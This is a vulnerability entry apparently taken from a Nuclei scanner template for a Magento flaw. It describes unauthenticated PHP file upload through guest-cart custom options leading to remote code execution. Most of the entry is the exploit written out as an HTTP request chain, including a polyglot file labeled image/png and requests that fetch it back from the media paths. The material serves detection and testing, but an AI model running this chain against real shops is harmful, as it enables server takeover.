# Vulnerability: Magento PolyShell – Unauthenticated File Upload to RCE
**Classification:** CWE-434,CWE-650
**Source:** Nuclei Template (`magento-polyshell-rce.yaml`)

## Description
Magento lacks file type validation on custom product options file upload feature accessible via unauthenticated REST/GraphQL APIs. Attackers can upload arbitrary PHP files through guest cart endpoints without authentication. Files are stored in pub/media/custom_options/quote/ directory with predictable paths. If web server allows PHP execution in media directories, this leads to remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /graphql HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"query": "{ products(search: \"\", pageSize: 1) { items { sku } } }"}

POST /rest/default/V1/guest-carts HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

POST /rest/default/V1/guest-carts/{{cart_id}}/items HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"cart_item":{"product_option":{"extension_attributes":{"custom_options":[{"extension_attributes":{"file_info":{"base64_encoded_data":"{{polyglot_b64}}","name":"{{php_filename}}","type":"image/png"}},"option_id":"12345","option_value":"file"}]}},"qty":1,"sku":"{{product_sku}}"}}

GET /pub/media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}} HTTP/1.1
Host: {{Hostname}}

GET /media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}} HTTP/1.1
Host: {{Hostname}}
```

